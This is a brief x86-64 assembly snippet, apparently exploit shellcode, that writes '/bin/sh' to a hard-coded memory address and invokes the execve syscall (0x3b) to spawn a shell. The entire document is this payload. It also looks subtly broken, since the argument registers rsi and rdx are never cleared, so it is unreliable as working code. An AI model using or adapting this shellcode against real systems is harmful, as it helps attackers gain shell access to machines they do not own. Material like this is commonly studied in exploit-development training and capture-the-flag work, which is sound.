; execve(["/bin/sh",], [], [])

bits 64
	mov rdi, 0x601060 
    mov qword [rdi], qword 0x6E69622F
	mov qword [rdi+4], qword 0x0068732F
	mov rax, 0x3b
	syscall
